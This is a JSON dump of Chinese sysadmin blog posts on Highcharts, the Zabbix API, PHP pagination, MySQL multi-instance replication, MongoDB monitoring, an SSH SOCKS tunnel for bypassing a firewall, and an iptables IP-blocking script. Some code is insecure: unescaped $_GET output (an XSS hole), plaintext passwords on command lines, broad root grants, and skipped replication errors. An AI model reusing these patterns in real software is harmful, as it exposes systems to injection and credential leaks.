&nbsp;","tags":[{"name":"highcharts","slug":"highcharts","permalink":"http://yoursite.com/tags/highcharts/"},{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"highcharts导出csv格式","date":"2016-09-27T10:56:17.000Z","path":"2016/09/27/highcharts-export-csv/","text":"业务需求报表导出格式为CSV，所以需要引用export-csv.js和exporting.js 代码如下: &lt;script src=”http://code.highcharts.com/stock/highstock.js&quot;&gt;&lt;/script&amp;gt;&lt;script src=”http://code.highcharts.com/modules/exporting.js&quot;&gt;&lt;/script&amp;gt;&lt;script src=”http://highcharts.github.io/export-csv/export-csv.js&quot;&gt;&lt;/script&amp;gt; &lt;div id=”container” style=”height: 300px; margin-top: 2em”&gt;&lt;/div&gt; &lt;script&gt;var chart = new Highcharts.StockChart({ chart: { renderTo: &apos;container&apos; }, navigator: { series: { includeInCSVExport: false } }, series: [{ data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6, 54.4], pointStart: Date.UTC(2016, 0, 1), pointInterval: 24 * 36e5 }], exporting: { csv: { dateFormat: &apos;%Y-%m-%d&apos; } } });&lt;/script&gt;显示效果： 导出结果： 参考：https://github.com/highcharts/export-csv","tags":[{"name":"export-csv","slug":"export-csv","permalink":"http://yoursite.com/tags/export-csv/"},{"name":"exporting","slug":"exporting","permalink":"http://yoursite.com/tags/exporting/"},{"name":"highcharts","slug":"highcharts","permalink":"http://yoursite.com/tags/highcharts/"}]},{"title":"Ajax+setInterval实时更新","date":"2016-09-20T15:07:31.000Z","path":"2016/09/20/ajax-setinterval/","text":"要求页面部分数据更新，具有实时性。需要用到定时器(setInter)和异步技术(Ajax)首先前段页面index.php&lt;div class=”count” id=”count” &gt;100&lt;/div&gt;&lt;script src=”/js/jquery-2.1.1.min.js”&gt;&lt;/script&gt;&lt;script type=”text/javascript”&gt; setInterval(function(){ $.ajax({ type:”post”, dataType:”json”, url: ‘index.php?r=test/getdata’, success:function(data){ $(“#count”).html(data[0][‘id’]); //console.log(data[0][‘id’]); }, error: function(){ alert(‘wrong’); }, }); },3000);&lt;/script&gt;后端处理页面，可以从数据库获取数据也可以中接口，这里自定义数组public function actionGetdata() { $data = array( array(‘id’=&gt;4,’name’=&gt;’test1’ ); echo json_encode($data); } public function actionIndex(){ return $this-&gt;render(‘index’); }浏览器访问http://test-advanced.com/index.php?r=test/index #test表示控制器，index表示方法更改数组里的id，前段页面数据实时变化","tags":[{"name":"ajax","slug":"ajax","permalink":"http://yoursite.com/tags/ajax/"},{"name":"setInterval","slug":"setInterval","permalink":"http://yoursite.com/tags/setInterval/"}]},{"title":"zabbix-api使用php版本","date":"2016-09-12T14:28:24.000Z","path":"2016/09/12/zabbix-api-php/","text":"API简介Zabbix API开始扮演着越来越重要的角色，尤其是在集成第三方软件和自动化日常任务时。很难想象管理数千台服务器而没有自动化是多么的困难。Zabbix API为批量操作、第三方软件集成以及其他作用提供可编程接口。 Zabbix API是在1.8版本中开始引进并且已经被广泛应用。所有的Zabbix移动客户端都是基于API，甚至原生的WEB前端部分也是建立在它之上。Zabbix API 中间件使得架构更加模块化也避免直接对数据库进行操作。它允许你通过JSON RPC协议来创建、更新和获取Zabbix对象并且做任何你喜欢的操作【当然前提是你拥有认证账户】。Zabbix API提供两项主要功能： 远程管理Zabbix配置 远程检索配置和历史数据#### 使用JSONAPI 采用JSON-RPC实现。这意味着调用任何函数，都需要发送POST请求，输入输出数据都是以JSON格式。大致工作流如下： 准备JSON对象，它描述了你想要做什么（创建主机，获取图像，更新监控项等）。 采用POST方法向http://example.com/zabbix/api_jsonrpc.php发送此JSON对象. http://example.com/zabbix/是Zabbix前端地址。api_jsonrpc.php是调用API的PHP脚本。可在安装可视化前端的目录下找到。 获取JSON格式响应。 注：请求除了必须是POST方法之外，HTTP Header Content-Type必须为【application/jsonrequest，application/json-rpc，application/json】其中之一。可以采用脚本或者任何”手动”支持JSON RPC的工具来使用API。而首先需要了解的就是如何验证和如何使用验证ID来获取想要的信息。#### 基本请求格式Zabbix API 简化的JSON请求如下：{“jsonrpc”: “2.0”,“method”: “method.name”,“params”: {“param_1_name”: “param_1_value”,“param_2_name”: “param_2value”},“id”: 1,“auth”: “159121b60d19a9b4b55d49e30cf12b81”,}下面一行一行来看： “jsonrpc”: “2.0”-这是标准的JSON RPC参数以标示协议版本。所有的请求都会保持不变。 “method”: “method.name”-这个参数定义了真实执行的操作。例如：host.create、item.update等等* “params”-这里通过传递JSON对象来作为特定方法的参数。如果你希望创建监控项，”name”和”key“参数是需要的，每个方法需要的参数在Zabbix API文档中都有描述。 “id”: 1-这个字段用于绑定JSON请求和响应。响应会跟请求有相同的”id”。在一次性发送多个请求时很有用，这些也不需要唯一或者连续 “auth”: “159121b60d19a9b4b55d49e30cf12b81”-这是一个认证令牌【authentication token】用以鉴别用户、访问API。这也是使用API进行相关操作的前提-获取认证ID。### API 使用 环境准备Zabbix API是基于JSON-RPC 2.0规格，具体实现可以选择任何你喜欢的编程语言或者手动方式。这里我们采用的Python和基于Curl的方式来做示例。Python 2.7版本已经支持JSON，所以不再需要其他模块组件。当然可以采用Perl、Ruby、PHP之类的语言，使用前先确保相应JSON模块的安装。 身份验证任何Zabbix API客户端在真正工作之前都需要验证它自身。在这里是采用User.login方法。这个方法接受一个用户名和密码作为参数并返回验证ID，一个安全哈希串用于持续的API调用（在使用User.logout之前该验证ID均有效）。这里使用php代码获取function Curl($url,$header,$info){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL, $url); curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch,CURLOPT_HTTPHEADER,$header); curl_setopt($ch,CURLOPT_POST, 1); curl_setopt($ch,CURLOPT_POSTFIELDS, $info); $response = curl_exec($ch); curl_close($ch); return json_decode($response); }//获取tokenfunction GetToken() { $logininfo = [ ‘jsonrpc’ =&gt; ‘2.0’, ‘method’ =&gt; ‘user.login’, ‘params’ =&gt; [ ‘user’ =&gt; ‘username’, ‘password’ =&gt; ‘password’, ], ‘id’ =&gt; 1, ]; $url = ‘http://www.example.com/api_jsonrpc.php‘; $data = json_encode($logininfo); $header = [“Content-type: application/json”]; //实例化模型 $model = new GetZabbixToken(); if (!$result = $model-&gt;Curl($url, $header, $data)) { echo ‘无法获取token’; exit; } $token = $result-&gt;result; return $token; }//获取主机信息function GetHosts() { $hostinfo = [ ‘jsonrpc’ =&gt; ‘2.0’, ‘method’ =&gt; ‘host.get’, ‘params’ =&gt; [ ‘output’ =&gt; [‘hostid’, ‘name’], ‘filter’ =&gt; [‘host’ =&gt; ‘’], ], ‘auth’ =&gt; GetToken(), ‘id’ =&gt; 1 ]; $url = ‘http://www.example.com/api_jsonrpc.php‘; $data = jsonencode($hostinfo); $header = [“Content-type: application/json”]; if (!$result = Curl($url, $header, $data)) { echo ‘无法获取主机信息’; exit; } return $result-&gt;result; }这里我用前端页面渲染，效果如下查看详情页是具体主机硬件信息代码如下：function GetInfo($hostid){ $info = [ ‘jsonrpc’ =&gt; ‘2.0’, ‘method’ =&gt; ‘item.get’, ‘params’ =&gt; [ ‘output’ =&gt; [‘key‘,’lastvalue’,’hostid’], ‘filter’ =&gt; [ ‘hostid’ =&gt; $hostid, ‘key_’ =&gt; [ ‘vfs.fs.size[/,total]’, ‘vfs.fs.size[/,used]’, ‘vfs.fs.size[/,free]’, ‘vfs.fs.size[/data,total]’, ‘vfs.fs.size[/data,used]’, ‘vfs.fs.size[/data,free]’, ‘system.cpu.load[percpu,avg15]’, ‘system.cpu.load[percpu,avg5]’, ‘system.cpu.load[percpu,avg1]’, ‘system.cpu.util[,idle]’, ‘system.cpu.switches’, ‘system.cpu.util[,interrupt]’, ‘system.cpu.util[,iowait]’, ‘vm.memory.size[available]’, ‘vm.memory.size[total]’, ‘custom.vfs.dev.read.ms[sda]’, ‘custom.vfs.dev.write.ms[sda]’, ‘icmpping’, ‘icmppingsec’, ‘icmppingloss’, ‘iptables.lines’, ‘kernel.maxfiles’, ‘net.if.in[em1]’, ‘net.if.in[em2]’, ‘net.if.in[em3]’, ‘net.if.in[em4]’, ‘net.if.out[em1]’, ‘net.if.out[em2]’, ‘net.if.out[em3]’, ‘net.if.out[em4]’, ‘proc.num[]’, ‘system.boottime’, ‘system.localtime’, ‘system.swap.size[,free]’, ‘system.swap.size[,pfree]’, ‘system.swap.size[,total]’, ‘system.uname’, ‘system.uptime’, ‘system.users.num’, ‘vfs.fs.inode[/,pfree]’, ‘vfs.fs.inode[/data,pfree]’, ], ], ], ‘auth’ =&gt; GetToken(), ‘id’ =&gt; 1, ]; $url = ‘http://www.example.com/api_jsonrpc.php‘; $info = json_encode($info); $header = [“Content-type: application/json”]; if(!$info = $model-&gt;Curl($url,$header,$info)){ echo ‘无法获取信息’; exit; } return $info-&gt;result; }&nbsp;","tags":[{"name":"zabbix-api","slug":"zabbix-api","permalink":"http://yoursite.com/tags/zabbix-api/"}]},{"title":"PHP数组分页","date":"2016-09-12T13:52:29.000Z","path":"2016/09/12/php-array-page/","text":"由于从api获取的数据无法通过框架分页类来分页，所以需要自己写分页方法代码如下&lt;?php//数组数据$data = array( array(‘id’=&gt;1,’name’=&gt;’test1’), array(‘id’=&gt;2,’name’=&gt;’test2’), array(‘id’=&gt;3,’name’=&gt;’test3’), array(‘id’=&gt;4,’name’=&gt;’test4’), array(‘id’=&gt;5,’name’=&gt;’test5’), array(‘id’=&gt;6,’name’=&gt;’test6’), array(‘id’=&gt;7,’name’=&gt;’test7’),);//获取当前页$page = intval(isset($_GET[‘page’])) ? intval($_GET[‘page’]) : 1;//排序order 0 - 不变 1- 反序$order = 0;//每页显示数$count = 3;$d = page_array($count,$page,$data,$order);echo ‘&lt;pre&gt;’ ;print_r($d);//url地址$url = ‘http://127.0.0.1:81/test.php‘;echo show_array($countpage,$url);/ 数组分页函数 核心函数 array_slice 用此函数之前要先将数据库里面的所有数据按一定的顺序查询出来存入数组中 $count 每页多少条数据 $page 当前第几页 $array 查询出来的所有数组 order 0 - 不变 1- 反序 /function page_array($count,$page,$array,$order){ global $countpage; #定全局变量 $page=(empty($page))?’1’:$page; #判断当前页面是否为空 如果为空就表示为第一页面 $start=($page-1)$count; #计算每次分页的开始位置 if($order==1){ $array=array_reverse($array); } $totals=count($array); $countpage=ceil($totals/$count); #计算总页面数 $pagedata=array(); $pagedata=array_slice($array,$start,$count); return $pagedata; #返回查询数据}/ 分页及显示函数 $countpage 全局变量，照写 $url 当前url /function show_array($countpage,$url){ $page=empty($_GET[‘page’])?1:$_GET[‘page’]; if($page &gt; 1){ $uppage=$page-1; }else{ $uppage=1; } if($page &lt; $countpage){ $nextpage=$page+1; }else{ $nextpage=$countpage; } $str=’&lt;div style=”border:1px; width:300px; height:30px; color:#9999CC”&gt;’; $str.=”&lt;span&gt;共 {$countpage} 页 / 第 {$page} 页&lt;/span&gt;&amp;nbsp;”; $str.=”&lt;span&gt;&lt;a href=’$url?page=1’&gt; 首页 &lt;/a&gt;&lt;/span&gt;&amp;nbsp;”; $str.=”&lt;span&gt;&lt;a href=’$url?page={$uppage}’&gt; 上一页 &lt;/a&gt;&lt;/span&gt;&amp;nbsp;”; $str.=”&lt;span&gt;&lt;a href=’$url?page={$nextpage}’&gt;下一页 &lt;/a&gt;&lt;/span&gt;&amp;nbsp;”; $str.=”&lt;span&gt;&lt;a href=’$url?page={$countpage}’&gt;尾页 &lt;/a&gt;&lt;/span&gt;&amp;nbsp;”; $str.=’&lt;/div&gt;’; return $str;}?&gt;结果如下：","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"},{"name":"php_array","slug":"php-array","permalink":"http://yoursite.com/tags/php-array/"},{"name":"show_array","slug":"show-array","permalink":"http://yoursite.com/tags/show-array/"}]},{"title":"mysql多实例","date":"2016-09-06T16:37:37.000Z","path":"2016/09/06/mysql-many-instance/","text":"需求： mysql主从复制，主mysql版本为5.5，从mysql版本为5.7 主库不需要操作，只在从数据库上配置 由于需要同步18个数据库，由于主库的端口各不相同，从库同样要开启18个实例 前面直接用脚本操作 #!/bin/bash #多实例端口号 port=\"3306 3312 3307 3319 3308 3309 3311 3330 3320 3321 3326 3327 3333 3314 3318 3323 3317 3316 3307\" for i in $port do #创建数据目录 mkdir /data/$i/dbdata -p #修改权限 chown mysql:mysql /data/$i -R #初始化数据库 /usr/local/mysql/bin/mysqld --initialize-insecure --user=\"mysql\" --basedir=\"/usr/local/mysql\" --datadir=\"/data/$i/dbdata\" #拷贝配置文件 cp /opt/my.cnf /data/$i/ #修改配置 sed -i \"s/3312/$i/g\" /data/$i/my.cnf #启动 mysqld_safe --defaults-file=\"/data/$i/my.cnf\" &amp; #登录,第一次登录默认密码为空 mysql -S /tmp/mysql$i.sock &lt;&lt; EOF #修改密码 use mysql; set password = password('******'); #授予权限 grant all on *.* to root@'192.168.61.%' identified by '******'; flush privileges; exit; EOF done 脚本注释： #初始化，5.7版本废弃mysql_install_db命令，该用mysqld 来初始化，—initialize 参数来创建密码，默认保存在~/.mysql_secret 。 —initialize-insecure 参数创建空密码 主配置文件 [client] port = 3312 socket = /tmp/mysql3312.sock default-character-set = utf8mb4 [mysql] prompt=\"MySQL [\\d]&gt; \" no-auto-rehash [mysqld] port = 3370 socket = /tmp/mysql3312.sock basedir = /usr/local/mysql datadir = /data/3312/dbdata pid-file = /data/3312/mysql.pid user = mysql bind-address = 0.0.0.0 server-id = 5 init-connect = 'SET NAMES utf8mb4' character-set-server = utf8mb4 skip-name-resolve log_bin = mysql-bin binlog_format = mixed expire_logs_days = 7 查看服务 [root@host-192-168-150-202 ~]# netstat -lutnp |grep mysqld tcp 0 0 0.0.0.0:3307 0.0.0.0:* LISTEN 28591/mysqld tcp 0 0 0.0.0.0:3308 0.0.0.0:* LISTEN 30546/mysqld tcp 0 0 0.0.0.0:3309 0.0.0.0:* LISTEN 31062/mysqld tcp 0 0 0.0.0.0:3311 0.0.0.0:* LISTEN 31564/mysqld tcp 0 0 0.0.0.0:3312 0.0.0.0:* LISTEN 27792/mysqld tcp 0 0 0.0.0.0:3314 0.0.0.0:* LISTEN 2978/mysqld tcp 0 0 0.0.0.0:3316 0.0.0.0:* LISTEN 5322/mysqld tcp 0 0 0.0.0.0:3317 0.0.0.0:* LISTEN 4736/mysqld tcp 0 0 0.0.0.0:3318 0.0.0.0:* LISTEN 3564/mysqld tcp 0 0 0.0.0.0:3319 0.0.0.0:* LISTEN 11531/mysqld tcp 0 0 0.0.0.0:3320 0.0.0.0:* LISTEN 32591/mysqld tcp 0 0 0.0.0.0:3321 0.0.0.0:* LISTEN 661/mysqld tcp 0 0 0.0.0.0:3323 0.0.0.0:* LISTEN 4150/mysqld tcp 0 0 0.0.0.0:3326 0.0.0.0:* LISTEN 1229/mysqld tcp 0 0 0.0.0.0:3327 0.0.0.0:* LISTEN 1774/mysqld tcp 0 0 0.0.0.0:3330 0.0.0.0:* LISTEN 32066/mysqld tcp 0 0 0.0.0.0:3333 0.0.0.0:* LISTEN 2392/mysqld tcp 0 0 0.0.0.0:3370 0.0.0.0:* LISTEN 6497/mysqld tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 5923/mysqld 登录到主数据库上查看file,pos等信息，来配置从数据库 #指定主服务器 mysql&gt; change master to master_host=\"192.168.101.22\",master_port=3370,master_user=\"kfuser\",master_password=\"kfpasswd\",master_log_file=\"mysql-bin.000006\",master_log_pos=246808818; mysql&gt; start slave; mysql&gt; show slave status\\G *************************** 1\\. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.101.99 Master_User: **** Master_Port: 3307 Connect_Retry: 60 Master_Log_File: mysql-bin.000007 Read_Master_Log_Pos: 326301199 Relay_Log_File: host-192-168-150-202-relay-bin.000002 Relay_Log_Pos: 164439916 Relay_Master_Log_File: mysql-bin.000007 Slave_IO_Running: Yes Slave_SQL_Running: Yes 错误1： Last_Errno: 1032Last_Error: Could not execute Update_rows_v1 event on table InfoServer_HS.ONLINENUMREALTIME; Can’t find record in ‘ONLINENUMREALTIME’, Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event’s master log mysql-bin.000006, end_log_pos 246506088造成1032错误的根本原因是主从数据库数据不一致,导致同步操作在从库上无法执行. 解决办法： vim /etc/my.cnfslave-skip-errors = 1032 #跳过这个错误错误2: Last_SQL_Errno: 1677Last_SQL_Error: Column 5 of table ‘InfoServer_HS.ONLINENUM20160906’ cannot be converted from type ‘varchar(100)’ to type ‘varchar(100)’解决办法： mysql&gt; stop slave;mysql&gt; set global slave_type_conversions=ALL_NON_LOSSY;mysql&gt; start slave;&nbsp;","tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"replication","slug":"replication","permalink":"http://yoursite.com/tags/replication/"}]},{"title":"zabbix监控mongodb","date":"2015-12-30T14:18:02.000Z","path":"2015/12/30/zabbix-monitor-mongodb/","text":"MongoDB（来自于英文单词“Humongous”，中文含义为“庞大”）是可以应用于各种规模的企业、各个行业以及各类应用程序的开源数据库。作为一个适用于敏捷开发的数据库，MongoDB的数据模式可以随着应用程序的发展而灵活地更新。与此同时，它也为开发人员 提供了传统数据库的功能：二级索引，完整的查询系统以及严格一致性等等。 MongoDB能够使企业更加具有敏捷性和可扩展性，各种规模的企业都可以通过使用MongoDB来创建新的应用，提高与客户之间的工作效率，加快产品上市时间，以及降低企业成本. 1. 下载模版cenhuqing@cenhuqingdeMBP ~$ wget http://mongoing.com/wp-content/uploads/2014/11/Mongodb_eshu.txt 模版名后缀改成xml，导入web模版 监控的参数有如下： connections BackgroundFlush curosor oplogstoragetime pagefaults queue index mem network Opcounters 2，配置客户端[root@zhishi ~]# vim /usr/local/etc/zabbix_agentd.conf Include=/usr/local/etc/zabbix.agentd.conf.d/*.conf 取消该注释 不取消也可以放在配置文件中。不过为了方便以后添加更多的参数所以创建文件 3.配置文件中添加参数注意：mongo带认证需要添加认证用户名和密码 [root@zhishi ~]# vim /usr/local/etc/zabbix_agentd.conf.d/monitor_mongodb.conf UserParameter=mongo.service,ps -ef | grep mongo |grep -v grep |wc -l UserParameter=mongo.mem_resident,echo \"db.serverStatus().mem\"| mongo -u root -p passwd admin|grep resident | cut -d \":\" -f 2 |cut -d \",\" -f 1| cut -d \" \" -f 2 UserParameter=mongo.mem_virtual,echo \"db.serverStatus().mem\"| mongo -u root -p passwd admin|grep virtual | cut -d \":\" -f 2 |cut -d \",\" -f 1| cut -d \" \" -f 2 UserParameter=mongo.mem_mapped,echo \"db.serverStatus().mem\"| mongo -u root -p passwd admin|grep '\\bmapped\\b' | cut -d \":\" -f 2 |cut -d \",\" -f 1| cut -d \" \" -f 2 UserParameter=mongo.network[*],echo \"db.serverStatus().network\"|mongo -u root -p passwd admin| grep $1 | cut -d \":\" -f 2 |cut -d \",\" -f1 |cut -d \" \" -f 2 UserParameter=mongo.index[*],echo \"db.serverStatus().indexCounters\"|mongo -u root -p passwd admin| grep $1| cut -d \":\" -f 2 |cut -d \",\" -f1 |cut -d \" \" -f 2 UserParameter=mongo.connection_current,echo \"db.serverStatus().connections\"| mongo -u root -p passwd admin| grep current|cut -d \":\" -f 2|cut -d \",\" -f 1|cut -d \" \" -f 2 UserParameter=mongo.connection_available,echo \"db.serverStatus().connections\"| mongo -u root -p passwd admin| grep current| cut -d \":\" -f 3|cut -d \",\" -f 1 |cut -d \" \" -f 2 UserParameter=mongo.opcounters[*],echo \"db.serverStatus().opcounters\" |mongo -u root -p passwd admin| grep $1|cut -d \":\" -f 2|cut -d \",\" -f 1 |cut -d \" \" -f 2 UserParameter=mongo.rpstatus,echo \"rs.status()\"| mongo -u root -p passwd admin| grep myState| cut -d \":\" -f 2| cut -d \",\" -f 1 |cut -d \" \" -f 2 UserParameter=mongo.queue_write,echo \"db.serverStatus().globalLock.currentQueue.writers\"|mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.queue_reader,echo \"db.serverStatus().globalLock.currentQueue.readers\"|mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.backgroundFlush,echo \"db.serverStatus().backgroundFlushing.last_ms\" |mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.curosor_Totalopen,echo \"db.serverStatus().cursors.totalOpen\" |mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.curospr_timedOu,echo \"db.serverStatus().cursors.timedOut\" |mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.pagefaults,echo \"db.serverStatus().extra_info.page_faults\" |mongo -u root -p passwd admin|sed -n 3p UserParameter=mongo.oplog_storetime,echo \"db.printReplicationInfo()\"|mongo -u root -p passwd admin|sed -n 4p|cut -d \"(\" -f 2|cut -d \"h\" -f 1 4.测试4.1 客户端测试 [root@zhishi ~]# echo \"db.serverStatus().mem\"| mongo -u root -p passwd admin|grep resident | cut -d \":\" -f 2 |cut -d \",\" -f 1| cut -d \" \" -f 2 93 4.2 监控端测试 [root@monitor ~]# zabbix_get -s 10.168.210.56 -k mongo.mem_resident 93 5.zabbix配置 &nbsp; &nbsp;","tags":[{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"},{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"}]},{"title":"ssh隧道翻墙","date":"2015-12-18T13:21:32.000Z","path":"2015/12/18/ssh-tunnel-over-the-wall/","text":"最近公司的网络到国外vps的路由丢包严重，国外vps上的shadowsocks无法使用我就从公司阿里云服务器上面测试下到国外的vps路由是否正常，经测试可以访问。然后我就想用阿里云做通道，公司到国外vps之间到通道。实现步骤： 1.云主机启用通道[root@monitor ~]# ssh -qTNf -D 0.0.0.0:12345 root@xo.xo.xo.xoroot@xo.xo.xo.xo’s password:查看监控端口 [root@monitor ~]# netstat -lutnp |grep 12345tcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN 19633/ssh添加防火墙策略 [root@monitor ~]# vim /etc/sysconfig/iptables-A INPUT -s xx.xx.xx.xx -p tcp –dport 12345 -j ACCEPT[root@monitor ~]# iptables -nL |grep 12345ACCEPT tcp – xx.xx.xx.xx 0.0.0.0/0 tcp dpt:12345 注：xo.xo.xo.xo为vps地址，xx.xx.xx.xx为云主机地址参数详解：-q表示该命令进入安静模式-T是指该命令不占用shell-N是指该命令不执行远程命令-f是指该命令在后台运行-D是该命令重要参数，他的后面跟着socks5服务器的地址与端口最后就是远程服务器用户名和地址也可以使用端口映射ssh -N -f -L 127.0.0.1:12345:10.21.0.34:22 test@12.3..4.5其中-N，-f作用上面已经讲了，这里最重要的是-L命令，它作用是做本地映射，使得远程服务器的端口相当于本地某自定义的端口，如上面的命令，本地的12345端口就相当于10.21.0.34的22端口，以后我只需要使用ssh user@127.0.0.1 -p 12345命令就能登录10.21.0.34了，注意user是10.21.0.34的用户，最后就是我们所使用的中间服务器，这个地址需要是我们直接访问到的。其实上面所说的A主机就是127.0.0.1，B主机就是12.3.4.5，C主机就是10.21.0.34。当然了，有本地映射肯定有远程映射，就是把-L换成-R，这样我们访问远程主机的端口就相当于访问本地的端口，但我没发现该功能的更多用途。如果你没有什么中间服务器，只是想做个端口映射，那也很简单，如下：ssh -N -f -L 12345:12.3.4.5:22 test@12.3.4.5 2.本地Chrome浏览器设置首先需要插件SwitchyOmega，可以chrome—&gt;更多工具—&gt;扩展程序—&gt;更多扩展程序里获取 也可以直接点击：https://chrome.google.com/webstore/category/extensions?hl=zh-CN 添加完成后，选项里设置新建情景模式 测试下效果","tags":[{"name":"socks","slug":"socks","permalink":"http://yoursite.com/tags/socks/"},{"name":"switchyOmega","slug":"switchyOmega","permalink":"http://yoursite.com/tags/switchyOmega/"},{"name":"tunnel","slug":"tunnel","permalink":"http://yoursite.com/tags/tunnel/"}]},{"title":"脚本自动添加ip到iptables","date":"2015-12-17T18:15:33.000Z","path":"2015/12/17/scripts-add-ip-to-iptables/","text":"nginx日志里有一些来历不明的ip攻击或者是用ssh来尝试登录你的密码 日志会记录这些来源的ip地址，根据ip地址来加入到iptables INPUT里，默认INPUT链为DROP 下面是我写的一个脚本，可以放到计划任务里，每天来统计 [root@VM-241 ~]# vim add_iptables.sh #!/bin/bash #日志文件logfile=/data/app/nginx/logs/access.log #统计ip，可以根据时间统计awk ‘/passport-send_vcode_sms.html/{print $1}’ $logfile |sort |uniq -c |sort -nr &gt; /root/ip.txt #已经在iptables中的地址droped_ip=$(iptables -L -n |awk ‘/^DROP/{print $4}’) #未加入iptables中的地址drop_ip=$(awk ‘{print $2}’ /root/ip.txt) #比较两个数组不同，把不同的ip加入到防火墙中add_ip=$(awk ‘NR==1{for(i=1;i&lt;=NF;i++) B[$i]=1}NR==2{for(j=1;j&lt;=NF;j++) {if(B[$j]!=1) print $j}} ‘ &lt;(echo $droped_ip) &lt;(echo $drop_ip))for i in $add_ipdo iptables -A INPUT -s $i -j DROP &amp;&amp; echo “已添加IP: $i 到防火墙丢弃策略中。”done #保存新加入的策略/etc/init.d/iptables save/etc/init.d/iptables reload执行前的iptables策略 [root@VM-241 ~]# iptables -L -nChain INPUT (policy DROP)target prot opt source destinationACCEPT all – 0.0.0.0/0 0.0.0.0/0ACCEPT all – 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHEDACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:21ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:8080ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:3690ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:80ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:443ACCEPT icmp – 0.0.0.0/0 0.0.0.0/0 limit: avg 100/sec burst 100ACCEPT icmp – 0.0.0.0/0 0.0.0.0/0 limit: avg 1/sec burst 10syn-flood tcp – 0.0.0.0/0 0.0.0.0/0 tcp flags:0x17/0x02REJECT all – 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibitedDROP all – 114.116.14.47 0.0.0.0/0DROP all – 1.58.120.217 0.0.0.0/0执行脚本 [root@VM-241 ~]# bash add_iptables.sh已添加IP: 218.88.85.184 到防火墙丢弃策略中。已添加IP: 122.227.51.102 到防火墙丢弃策略中。已添加IP: 122.235.180.60 到防火墙丢弃策略中。已添加IP: 122.95.241.64 到防火墙丢弃策略中。已添加IP: 210.21.220.68 到防火墙丢弃策略中。已添加IP: 106.226.24.23 到防火墙丢弃策略中。已添加IP: 60.184.47.12 到防火墙丢弃策略中。已添加IP: 220.113.94.30 到防火墙丢弃策略中。已添加IP: 58.253.150.96 到防火墙丢弃策略中。已添加IP: 110.81.117.78 到防火墙丢弃策略中。已添加IP: 119.132.156.176 到防火墙丢弃策略中。已添加IP: 220.171.210.251 到防火墙丢弃策略中。已添加IP: 101.233.125.137 到防火墙丢弃策略中。已添加IP: 60.162.152.102 到防火墙丢弃策略中。已添加IP: 123.97.164.49 到防火墙丢弃策略中。已添加IP: 114.83.216.53 到防火墙丢弃策略中。已添加IP: 171.117.124.119 到防火墙丢弃策略中。已添加IP: 58.254.4.13 到防火墙丢弃策略中。执行脚本后的iptables策略 [root@VM-241 ~]# iptables -L -nChain INPUT (policy DROP)target prot opt source destinationACCEPT all – 0.0.0.0/0 0.0.0.0/0ACCEPT all – 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHEDACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:21ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:8080ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:3690ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:80ACCEPT tcp – 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:443ACCEPT icmp – 0.0.0.0/0 0.0.0.0/0 limit: avg 100/sec burst 100ACCEPT icmp – 0.0.0.0/0 0.0.0.0/0 limit: avg 1/sec burst 10syn-flood tcp – 0.0.0.0/0 0.0.0.0/0 tcp flags:0x17/0x02REJECT all – 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibitedDROP all – 114.116.14.47 0.0.0.0/0DROP all – 1.58.120.217 0.0.0.0/0DROP all – 218.88.85.184 0.0.0.0/0DROP all – 122.227.51.102 0.0.0.0/0DROP all – 122.235.180.60 0.0.0.0/0DROP all – 122.95.241.64 0.0.0.0/0DROP all – 210.21.220.68 0.0.0.0/0DROP all – 106.226.24.23 0.0.0.0/0DROP all – 60.184.47.12 0.0.0.0/0DROP all – 220.113.94.30 0.0.0.0/0DROP all – 58.253.150.96 0.0.0.0/0DROP all – 110.81.117.78 0.0.0.0/0DROP all – 119.132.156.176 0.0.0.0/0DROP all – 220.171.210.251 0.0.0.0/0DROP all – 101.233.125.137 0.0.0.0/0DROP all – 60.162.152.102 0.0.0.0/0DROP all – 123.97.164.49 0.0.0.0/0DROP all – 114.83.216.53 0.0.0.0/0DROP all – 171.117.124.119 0.0.0.0/0DROP all – 58.254.4.13 0.0.0.0/0&nbsp;","tags":[{"name":"awk","slug":"awk","permalink":"http://yoursite.com/tags/awk/"},{"name":"iptables","slug":"iptables","permalink":"http://yoursite.com/tags/iptables/"}]},{"title":"安装mongodb-enterprise-2.6","date":"2015-12-08T11:38:38.000Z","path":"2015/12/08/install-mongodb-enterprise-2-6/","text":"MongoDB社区版本和企业版本差异主要体现在安全认证、系统认证等方面，具体信息参考下表： 版本特性 社区版本 企业版本 JSON数据模型、自由模式 支持 